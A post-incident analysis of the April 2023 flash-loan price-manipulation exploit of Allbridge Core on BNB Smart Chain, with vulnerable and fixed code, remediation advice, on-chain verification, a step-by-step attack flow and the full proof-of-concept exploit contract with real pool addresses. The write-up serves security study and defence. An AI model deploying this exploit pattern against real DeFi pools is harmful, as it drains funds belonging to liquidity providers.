# Allbridge — Flawed Price Dependency Analysis

| Field | Details |
|------|------|
| **Date** | 2023-04-01 |
| **Protocol** | Allbridge Core |
| **Chain** | BSC (BNB Smart Chain) |
| **Loss** | ~$570,000 (on-chain confirmed: 549,874 BUSD) |
| **Attacker** | [0xC578...3984](https://bscscan.com/address/0xC578d755Cd56255d3fF6E92E1B6371bA945e3984) |
| **Attack Contract** | [0x7d83...725d7](https://bscscan.com/address/0x7d83FE202c51982A72e0A1146Ec37b4643c725d7) |
| **Attack Tx** | [0x7ff1...8210](https://bscscan.com/tx/0x7ff1364c3b3b296b411965339ed956da5d17058f3164425ce800d64f1aef8210) |
| **Attack Block** | 26,982,068 |
| **Vulnerable Contract (BUSD Pool)** | [0x179a...9ca0](https://bscscan.com/address/0x179aaD597399B9ae078acFE2B746C09117799ca0) |
| **Vulnerable Contract (BSC-USD Pool)** | [0xB19C...2554](https://bscscan.com/address/0xB19Cd6AB3890f18B662904fd7a40C003703d2554) |
| **Swap Router (AMM)** | [0x312B...fb0](https://bscscan.com/address/0x312Bc7eAAF93f1C60Dc5AfC115FcCDE161055fb0) |
| **Bridge Contract** | [0x7E6c...260A](https://bscscan.com/address/0x7E6c2522fEE4E74A0182B9C6159048361BC3260A) |
| **Root Cause** | Flawed price calculation logic that directly depends on the in-pool token balance ratio (vUSD/token) |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-04/Allbridge_exp.sol) |

---

## 1. Vulnerability Overview

On April 1, 2023, Allbridge Core suffered approximately $570,000 in losses on BSC due to a **Flawed Price Dependency** vulnerability.

Allbridge Core is a stablecoin bridge protocol that dynamically calculates swap prices based on the **ratio** of virtual USD (vUSD) balance to actual token balance within the pool. The fundamental problem with this design is that **this ratio can be freely manipulated within a single transaction via flash loans**.

The attacker simultaneously performed two roles to break the pool's price mechanism:

1. **Liquidity Provider role**: Deposited large amounts of funds to distort the pool's token composition ratio
2. **Swapper role**: Executed bridge swaps in the distorted state to push the vUSD/token ratio to an extreme

As a result, the attacker obtained approximately **~20x profit**, withdrawing ~$790,000 worth of BSC-USD with only ~$40,000 in BUSD.

**Core vulnerability combination**:
- V-01: Price calculation logic that directly depends on manipulable on-chain balances (CWE-1025)
- V-02: Price manipulation within a single transaction via flash loan (CWE-841)
- V-03: Pool state exploitation due to coupling between liquidity provision and price calculation (CWE-668)

---

## 2. Vulnerable Code Analysis

### 2.1 Flawed Price Calculation Logic — vUSD Ratio Dependency (Core Vulnerability)

The Allbridge Core pool calculated swap prices in the following manner. The ratio of the pool's `vUsdBalance` (virtual USD balance) to the actual token balance serves as the price basis.

**Vulnerable code (estimated)**:
```solidity
// ❌ VULNERABLE: Price calculation that directly depends on current pool balance ratio
// vUsdBalance can change in real time via swaps/deposits/withdrawals
function getSwapToVUsdPrice(
    uint256 amount,
    uint256 tokenBalance,
    uint256 vUsdBalance
) internal pure returns (uint256) {
    // ❌ Exchange rate determined by ratio of current token balance to vUSD balance in the pool
    // Attacker can freely manipulate this ratio via large-scale liquidity deposits/withdrawals
    return (amount * vUsdBalance) / tokenBalance;
}

function swap(
    uint256 amount,
    bytes32 token,
    bytes32 receiveToken,
    address recipient
) external {
    address tokenAddr = bytes32ToAddress(token);
    address receiveTokenAddr = bytes32ToAddress(receiveToken);

    // ❌ Price calculated based on manipulable current balances
    uint256 vUsdAmount = getSwapToVUsdPrice(
        amount,
        IERC20(tokenAddr).balanceOf(address(this)),  // ❌ Current balance used directly
        pools[token].vUsdBalance                      // ❌ Mutable state used directly
    );

    uint256 receiveAmount = getSwapFromVUsdPrice(
        vUsdAmount,
        IERC20(receiveTokenAddr).balanceOf(address(this)), // ❌ Manipulated balance
        pools[receiveToken].vUsdBalance
    );

    // Execute transfer (no price validity check)
    IERC20(receiveTokenAddr).transfer(recipient, receiveAmount);
}
```

**Fixed code**:
```solidity
// ✅ Fix 1: Introduce TWAP (Time-Weighted Average Price)
// Apply time-weighting to prevent price manipulation within a single block
mapping(bytes32 => PriceObservation[]) public priceHistory;
uint256 public constant TWAP_PERIOD = 30 minutes;

function getTwapPrice(bytes32 token) internal view returns (uint256) {
    // ✅ Returns the average vUSD ratio over the last TWAP_PERIOD
    PriceObservation[] storage obs = priceHistory[token];
    // ... time-weighted average calculation ...
}

// ✅ Fix 2: Apply price deviation cap on swaps
uint256 public constant MAX_PRICE_DEVIATION = 300; // 3% (in basis points)

function swap(...) external {
    uint256 currentPrice = getCurrentPrice(token);
    uint256 twapPrice = getTwapPrice(token);

    // ✅ Reject if current price deviates from TWAP by more than MAX_PRICE_DEVIATION
    require(
        abs(currentPrice - twapPrice) * 10000 / twapPrice <= MAX_PRICE_DEVIATION,
        "Allbridge: price deviation too high"
    );
    // ... execute swap ...
}

// ✅ Fix 3: Block immediate swap after liquidity deposit within the same transaction
mapping(address => uint256) public lastDepositBlock;

function deposit(uint256 amount) external {
    lastDepositBlock[msg.sender] = block.number;
    // ... deposit logic ...
}

function swap(...) external {
    // ✅ Addresses that deposited in the same block cannot swap
    require(
        lastDepositBlock[msg.sender] < block.number,
        "Allbridge: cannot swap in same block as deposit"
    );
    // ... execute swap ...
}
```

**Problem**: Allbridge Core's swap price directly depends on the current pool's `vUsdBalance / tokenBalance` ratio. An attacker can artificially manipulate this ratio by depositing/swapping large amounts obtained via flash loans, and with no anomaly detection mechanism in place, immediate exploitation was possible.

### 2.2 LP Token Calculation Vulnerability in the `withdraw()` Function

**Vulnerable code (estimated)**:
```solidity
// ❌ VULNERABLE: LP token value is calculated based on the manipulated pool state
function withdraw(uint256 amountLp) external {
    uint256 totalLp = totalSupply();
    uint256 tokenBalance = IERC20(token).balanceOf(address(this));

    // ❌ LP tokens issued under manipulated state (vUsdBalance)
    //    are redeemed against the current (manipulated) state
    // Attacker can deposit when price is favorable and withdraw when it becomes even more favorable
    uint256 receiveAmount = (amountLp * tokenBalance) / totalLp;

    _burn(msg.sender, amountLp);
    IERC20(token).transfer(msg.sender, receiveAmount);
}
```

**Fixed code**:
```solidity
// ✅ Fix: Check for price manipulation on withdrawal + guarantee minimum output amount
function withdraw(uint256 amountLp, uint256 minReceiveAmount) external {
    uint256 totalLp = totalSupply();
    uint256 tokenBalance = IERC20(token).balanceOf(address(this));
    uint256 receiveAmount = (amountLp * tokenBalance) / totalLp;

    // ✅ Slippage protection: reject if minimum output amount is not met
    require(receiveAmount >= minReceiveAmount, "Allbridge: insufficient output");

    // ✅ Verify pool state is within normal range after withdrawal
    uint256 remainingBalance = tokenBalance - receiveAmount;
    require(
        isPoolBalanced(remainingBalance, pools[token].vUsdBalance),
        "Allbridge: pool imbalance too high after withdraw"
    );

    _burn(msg.sender, amountLp);
    IERC20(token).transfer(msg.sender, receiveAmount);
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker EOA `0xC578...3984` deployed attack contract `0x7d83...725d7` (estimated at nonce=1838)
- Secured sufficient gas for attack execution (actual gasUsed: 1,244,027)
- Relied entirely on flash loans with no pre-existing capital

### 3.2 Execution Phase

```
┌─────────────────────────────────────────────────────────────────────┐
│  Attacker EOA (0xC578...3984)                                        │
│  nonce: 1839, block: 26,982,068                                      │
└────────────────────────┬────────────────────────────────────────────┘
                         │ call run()
                         ▼
┌─────────────────────────────────────────────────────────────────────┐
│  Attack Contract (0x7d83...725d7)                                    │
│  Step 1: Request flash loan from PancakeSwap                         │
│  pancakeSwap.swap(0, 7_500_000e18, address(this), "Gimme da loot")  │
└────────────────────────┬────────────────────────────────────────────┘
                         │ Receive 7,500,000 BUSD (on-chain confirmed)
                         ▼
┌─────────────────────────────────────────────────────────────────────┐
│  pancakeCall() callback execution                                    │
│                                                                      │
│  [Step 2] pool_0x312B.swap(BUSD→BSC-USD, 2,003,300)                 │
│           Result: ~2,000,296 BSC-USD received                        │
│                                                                      │
│  [Step 3] pool_0x179a.deposit(5,000,000 BUSD)                       │
│           → Inject large liquidity into BUSD pool (receive LP tokens)│
│                                                                      │
│  [Step 4] pool_0x312B.swap(BUSD→BSC-USD, 496,700)                   │
│           → Acquire additional BSC-USD                               │
│                                                                      │
│  [Step 5] pool_0xb19c.deposit(2,000,000 BSC-USD)                    │
│           → Inject liquidity into BSC-USD pool (receive LP tokens)   │
└────────────────────────┬────────────────────────────────────────────┘
                         │ Pool imbalance established
                         ▼
┌─────────────────────────────────────────────────────────────────────┐
│  [Step 6] bridge.swap(BSC_USD_bal, bsc_usd→busd, address(this))     │
│           → Swap entire BSC-USD holdings for BUSD                    │
│           → This swap pushes pool_0x179a's vUSD/BUSD ratio to extreme│
│           ★ Key: induces state where vUsdBalance >> tokenBalance     │
│             in BUSD pool                                             │
└────────────────────────┬────────────────────────────────────────────┘
                         │ Price distortion state established
                         ▼
┌─────────────────────────────────────────────────────────────────────┐
│  [Step 7] pool_0x179a.withdraw(4,830,262,616 LP)                    │
│           → Withdraw far more BUSD than the deposited 5,000,000 BUSD │
│           → On-chain actual receipt: ~5,322,403 BUSD (~322,403 BUSD  │
│             profit)                                                  │
└────────────────────────┬────────────────────────────────────────────┘
                         │ Over-withdrawal successful
                         ▼
┌─────────────────────────────────────────────────────────────────────┐
│  [Step 8] bridge.swap(40,000 BUSD → BSC-USD, address(this))         │
│           → Exchange only 40,000 BUSD for ~790,000 BSC-USD at       │
│             manipulated price                                        │
│           ★ Core profit phase: ~20x leverage effect                  │
└────────────────────────┬────────────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────────────┐
│  [Step 9] pool_0xb19c.withdraw(1,993,728,530 LP)                    │
│           → Receive deposited 2,000,000 BSC-USD + yield              │
│             (~2,786,062 BSC-USD)                                     │
│                                                                      │
│  [Step 10] pool_0x312B.swap(all BSC-USD → BUSD)                     │
│            → Convert BSC-USD to BUSD                                 │
│                                                                      │
│  [Step 11] BUSD.transfer(pancakeSwap, 7,522,500)                    │
│            → Repay flash loan principal + fee                        │
│                                                                      │
│  [Step 12] BUSD.transfer(attacker, 549,874 BUSD)                    │
│            → Transfer net profit to attacker wallet                  │
└─────────────────────────────────────────────────────────────────────┘
```

### 3.3 Results

| Item | Amount |
|------|------|
| Flash loan borrowed | 7,500,000 BUSD |
| Flash loan repaid | 7,522,500 BUSD (fee: 22,500 BUSD) |
| Attacker net profit | **549,874 BUSD** (on-chain confirmed) |
| Protocol loss | ~$570,000 (combined BUSD + BSC-USD pools) |

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @Analysis: https://twitter.com/BeosinAlert/status/1642372700726505473
// @Tx: https://bscscan.com/tx/0x7ff1364c3b3b296b411965339ed956da5d17058f3164425ce800d64f1aef8210

contract Exploit {
    // Define key contract addresses
    IPancakePair pancakeSwap = IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);
    IERC20 BUSD    = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 BSC_USD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IPool  pool_0x312B = IPool(0x312Bc7eAAF93f1C60Dc5AfC115FcCDE161055fb0);  // AMM swap pool
    IPool2 pool_0x179a = IPool2(0x179aaD597399B9ae078acFE2B746C09117799ca0); // BUSD liquidity pool
    IPool2 pool_0xb19c = IPool2(0xB19Cd6AB3890f18B662904fd7a40C003703d2554); // BSC-USD liquidity pool
    IBridge bridge = IBridge(0x7E6c2522fEE4E74A0182B9C6159048361BC3260A);   // Bridge swap

    function run() external {
        // [Step 1] Request 7,500,000 BUSD flash loan from PancakeSwap
        pancakeSwap.swap(0, 7_500_000e18, address(this), "Gimme da loot");
    }

    function pancakeCall(address, uint256, uint256, bytes calldata) external {
        BUSD.approve(address(pool_0x312B), type(uint256).max);
        BSC_USD.approve(address(pool_0x312B), type(uint256).max);

        // [Step 2] Swap 2,003,300 BUSD → ~2,000,296 BSC-USD (prepare pool imbalance)
        pool_0x312B.swap(
            address(BUSD), address(BSC_USD),
            2_003_300e18, 1, address(this), block.timestamp + 100 seconds
        );

        // [Step 3] Deposit 5,000,000 BUSD into pool_0x179a → receive LP tokens
        // At this point, large liquidity is injected into BUSD pool, changing vUSD/token ratio
        BUSD.approve(address(pool_0x179a), type(uint256).max);
        pool_0x179a.deposit(5_000_000e18);

        // [Step 4] Additional swap: 496,700 BUSD → BSC-USD
        pool_0x312B.swap(
            address(BUSD), address(BSC_USD),
            496_700e18, 1, address(this), block.timestamp + 100 seconds
        );

        // [Step 5] Deposit 2,000,000 BSC-USD into pool_0xb19c → receive LP tokens
        BSC_USD.approve(address(pool_0xb19c), type(uint256).max);
        pool_0xb19c.deposit(2_000_000e18);

        bytes32 bsc_usd = 0x00000000000000000000000055d398326f99059ff775485246999027b3197955;
        bytes32 busd    = 0x000000000000000000000000e9e7cea3dedca5984780bafc599bd69add087d56;

        // [Step 6] Bridge swap entire BSC-USD holdings (BSC-USD → BUSD)
        // This swap pushes pool_0x179a's vUSD/BUSD ratio to an extreme
        // → vUsdBalance >> tokenBalance → "nominal value" of BUSD skyrockets
        uint256 BSC_USD_bal = BSC_USD.balanceOf(address(this));
        bridge.swap(BSC_USD_bal, bsc_usd, busd, address(this));

        // [Step 7] Burn LP tokens from pool_0x179a and withdraw BUSD
        // Receive ~5,322,403 BUSD vs. deposited 5M BUSD at distorted price
        pool_0x179a.withdraw(4_830_262_616);  // LP token amount

        // [Step 8] Core attack: exchange only 40,000 BUSD for ~790,000 BSC-USD
        // Liquidity drain from pool_0x179a withdrawal → BUSD pool depletion → reverse price spike
        bridge.swap(40_000e18, busd, bsc_usd, address(this));

        // [Step 9] Withdraw BSC-USD from pool_0xb19c (~2,786,062 BSC-USD)
        pool_0xb19c.withdraw(1_993_728_530);  // LP token amount

        // [Step 10] Convert entire BSC-USD holdings back to BUSD
        BSC_USD_bal = BSC_USD.balanceOf(address(this));
        pool_0x312B.swap(
            address(BSC_USD), address(BUSD),
            BSC_USD_bal, 1, address(this), block.timestamp + 100 seconds
        );

        // [Step 11] Repay flash loan principal + fee (0.3%): 7,522,500 BUSD
        BUSD.transfer(address(pancakeSwap), 7_522_500e18);

        // [Step 12] Transfer net profit (549,874 BUSD) to attacker EOA
        BUSD.transfer(tx.origin, BUSD.balanceOf(address(this)));
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | Price calculation based on manipulable on-chain balances | CRITICAL | CWE-1025 (Insufficient Comparison Logic) | `04_oracle_manipulation.md` |
| V-02 | Single-transaction price manipulation via flash loan | CRITICAL | CWE-841 (Improper Enforcement of Behavioral Workflow) | `02_flash_loan.md` |
| V-03 | Coupling vulnerability between liquidity deposit and price mechanism | HIGH | CWE-668 (Exposure of Resource to Wrong Sphere) | `11_logic_error.md` |
| V-04 | Missing price deviation check in bridge swap | HIGH | CWE-20 (Insufficient Input Validation) | `12_bridge_crosschain.md` |

### V-01: Price Calculation Based on Manipulable On-Chain Balances

- **Description**: Allbridge Core's swap price directly depends on the current pool's `vUsdBalance / tokenBalance` ratio. Both values can be freely manipulated within a single transaction via flash loans.
- **Impact**: Attacker achieved ~20x price manipulation, exchanging 40,000 BUSD for ~790,000 BSC-USD. Total loss ~$570,000.
- **Attack Conditions**: Flash loan access available, deposit/withdraw permissions on liquidity pool, ability to execute operations within the same transaction

### V-02: Single-Transaction Price Manipulation via Flash Loan

- **Description**: Large amounts of capital (7,500,000 BUSD) can be borrowed collateral-free within a single transaction, enabling sequential complex operations (deposit→swap→withdraw) to be executed atomically.
- **Impact**: $570,000 stolen in a single transaction with no pre-existing capital.
- **Attack Conditions**: Flash loan service (e.g., PancakeSwap) accessible, callback contract implemented

### V-03: Coupling Vulnerability Between Liquidity Deposit and Price Mechanism

- **Description**: Since liquidity providers (LPs) and swappers share the same pool state (`vUsdBalance`), large-scale LP deposits immediately affect the price calculation mechanism. There is no proper isolation between the two roles.
- **Impact**: Attacker can artificially distort pool state as an LP, then execute a swap at the distorted price within the same transaction — a composite attack.
- **Attack Conditions**: Ability to sequentially execute deposit/swap/withdraw on the same pool

### V-04: Missing Price Deviation Check in Bridge Swap

- **Description**: The `bridge.swap()` function does not check how far the current price has deviated from a reference price, allowing swaps to execute even at extremely unfavorable prices.
- **Impact**: Swap executed with >20x deviation from normal price, resulting in large-scale capital outflow.
- **Attack Conditions**: Price manipulation state must be established in advance

---

## 6. Remediation Recommendations

### Immediate Actions

**1) Apply price deviation cap on swaps**:
```solidity
// ✅ Assess price anomaly before executing swap
uint256 public constant MAX_SWAP_DEVIATION_BPS = 200; // 2% cap

function swap(uint256 amount, bytes32 token, bytes32 receiveToken, address recipient) external {
    uint256 impliedPrice = computeSwapPrice(amount, token, receiveToken);
    uint256 referencePrice = getReferencePrice(token, receiveToken); // TWAP or external oracle

    uint256 deviationBps = abs(impliedPrice - referencePrice) * 10000 / referencePrice;
    require(deviationBps <= MAX_SWAP_DEVIATION_BPS, "Allbridge: price deviation too large");

    // Execute swap
}
```

**2) Block sequential deposit-withdraw-swap within the same block**:
```solidity
// ✅ Apply block-level cooldown
mapping(address => uint256) public lastActionBlock;

modifier notSameBlock() {
    require(lastActionBlock[msg.sender] < block.number, "Allbridge: same block restriction");
    _;
    lastActionBlock[msg.sender] = block.number;
}

function deposit(uint256 amount) external notSameBlock { ... }
function withdraw(uint256 amountLp) external notSameBlock { ... }
```

**3) Limit large single trades (temporary emergency measure)**:
```solidity
// ✅ Set single trade cap relative to pool TVL (e.g., 1%)
uint256 public constant MAX_SINGLE_TRADE_BPS = 100; // 1%

function swap(...) external {
    uint256 maxAmount = IERC20(tokenAddr).balanceOf(address(this)) * MAX_SINGLE_TRADE_BPS / 10000;
    require(amount <= maxAmount, "Allbridge: single trade limit exceeded");
    ...
}
```

### Structural Improvements

| Vulnerability | Recommended Action | Priority |
|--------|-----------|----------|
| V-01 Manipulable price calculation | Introduce TWAP or external oracle (Chainlink) to eliminate dependence on current balances | CRITICAL |
| V-02 Flash loan abuse | EIP-3156-compliant flash loan reentrancy prevention, detection of atomic composite manipulation | CRITICAL |
| V-03 LP-price coupling vulnerability | Introduce timelock between liquidity deposit and price reference | HIGH |
| V-04 Missing price deviation check | Dual validation of slippage + price deviation before swap execution | HIGH |

---

## 7. Lessons Learned

1. **On-chain current balances are an untrusted price source**: Current AMM pool balances (`balanceOf`, `getReserves`) can be freely manipulated within a single transaction via flash loans. Price calculations must always use manipulation-resistant oracles such as TWAP or Chainlink.

2. **Liquidity provision and trading must not share state**: A design where LP deposits immediately affect prices allows an attacker to simultaneously perform both roles to manipulate prices. A delay or timelock should be introduced so that deposits only affect prices after a certain period.

3. **Flash loans provide attackers with unlimited capital**: If a protocol is vulnerable to large single trades, flash loans can amplify that vulnerability. Designs that prevent atomic execution of composite operations (deposit→swap→withdraw) within a single transaction are necessary.

4. **Circuit breakers for extreme price deviations are essential**: Swaps at prices outside the normal range should be automatically rejected. This is the last line of defense against attacks that exploit manipulated price states.

5. **Security design must account for vulnerability combinations, not individual vulnerabilities**: This attack was made possible by the triple combination of 'flawed price dependency' + 'flash loan' + 'LP-swap coupling'. Each vulnerability in isolation may be assessed as low risk, but in combination they reach CRITICAL severity. Threat modeling from an attack chain perspective — rather than a single-vulnerability perspective — is required.

6. **The reality of white-hat bounty negotiations**: After the attack, Allbridge offered a 10% bounty, and the attacker returned approximately 1,500 BNB (~$466,000) while retaining the remainder as a bounty. This demonstrates the limits of post-incident recovery. Prevention is far more effective than post-hoc remediation.

---

## 8. On-Chain Verification

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | PoC Stated Value | On-Chain Actual Value | Match |
|------|------------|-------------|----------|
| Flash loan borrowed (BUSD) | 7,500,000 | **7,500,000** | ✅ Exact match |
| BUSD→BSC-USD swap 1st | 2,003,300 | **2,003,300** | ✅ Exact match |
| BSC-USD received (1st) | ~2,000,000 | **2,000,296** | ✅ Approximate match |
| pool_0x179a BUSD deposit | 5,000,000 | **5,000,000** | ✅ Exact match |
| BUSD→BSC-USD swap 2nd | 496,700 | **496,700** | ✅ Exact match |
| pool_0xb19c BSC-USD deposit | 2,000,000 | **2,000,000** | ✅ Exact match |
| pool_0x179a withdraw LP | 4,830,262,616 | **4,830,262,616** | ✅ Exact match |
| pool_0x179a BUSD total received | (not stated) | **~5,322,403** | - On-chain measured |
| 2nd bridge swap (BUSD input) | 40,000 | **40,000** | ✅ Exact match |
| pool_0xb19c withdraw LP | 1,993,728,530 | **1,993,728,530** | ✅ Exact match |
| Flash loan repaid (BUSD) | 7,522,500 | **7,522,500** | ✅ Exact match |
| Attacker final receipt (BUSD) | (not stated) | **549,874** | - On-chain measured |

### 8.2 On-Chain Event Log Sequence (Key Events)

| Log Index | Event | Contract | Description |
|------------|--------|---------|------|
| 0x00 | Transfer | BUSD | PancakeSwap → Attack Contract: 7,500,000 BUSD (flash loan received) |
| 0x04 | Transfer | BUSD | Attack Contract → pool_0x312B: 2,003,300 BUSD (1st swap) |
| 0x06 | Transfer | BSC-USD | pool_0x312B → Attack Contract: ~2,000,296 BSC-USD |
| 0x07 | SwapEvent | pool_0x312B | BUSD→BSC-USD swap confirmation event |
| 0x09 | Transfer | BUSD | Attack Contract → pool_0x179a: 5,000,000 BUSD (deposit) |
| 0x0b | Deposit | pool_0x179a | LP token minting confirmed |
| 0x10 | Transfer | BSC-USD | Attack Contract → pool_0xb19c: 2,000,000 BSC-USD (deposit) |
| 0x12 | Deposit | pool_0xb19c | LP token minting confirmed |
| 0x16-0x1b | Transfer | BUSD | pool_0x179a → Attack Contract: total ~5,322,403 BUSD (excess withdrawal) |
| 0x17 | Withdraw | pool_0x179a | Withdrawal event confirmed |
| 0x1f-0x24 | Transfer | BSC-USD | pool_0xb19c → Attack Contract: total ~2,786,062 BSC-USD |
| 0x20 | Withdraw | pool_0xb19c | Withdrawal event confirmed |
| 0x29 | Transfer | BUSD | Attack Contract → PancakeSwap: 7,522,500 BUSD (flash loan repayment) |
| 0x2a | Transfer | BUSD | Attack Contract → Attacker EOA: **549,874 BUSD** (net profit) |

### 8.3 Transaction Basic Information

| Field | Value |
|------|-----|
| Block Number | 26,982,068 |
| from (Attacker EOA) | 0xC578d755Cd56255d3fF6E92E1B6371bA945e3984 |
| to (Attack Contract) | 0x7d83FE202c51982A72e0A1146Ec37b4643c725d7 |
| gasUsed | 1,244,027 |
| gasPrice | 50 Gwei |
| Status | 1 (success) |
| Total log count | 45 (0x00 ~ 0x2c) |

### 8.4 On-Chain Verification Conclusion

- All explicit amounts in the PoC code **exactly match** on-chain actual values
- pool_0x179a received **5,322,403 BUSD** vs. deposited 5,000,000 BUSD — confirmed excess receipt of 322,403 BUSD due to manipulation
- Final attacker receipt: **549,874 BUSD** (consistent with PoC reference of "$550,000")
- Confirmed that the root cause (Flawed Price Dependency) is fully consistent with the on-chain event sequence

---

*References*:
- [BeosinAlert Analysis Twitter](https://twitter.com/BeosinAlert/status/1642372700726505473)
- [Lunaray Attack Analysis](https://lunaray.medium.com/allbridge-attack-analysis-f2d59be542ff)
- [QuillAudits Detailed Analysis](https://medium.com/coinmonks/decoding-allbridge-570k-flash-loan-exploit-quillaudits-8da8dccd729d)
- [Neptune Mutual Analysis](https://medium.com/neptune-mutual/how-was-allbridge-exploited-956a05f3cb58)
- [DeFiHackLabs PoC](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-04/Allbridge_exp.sol)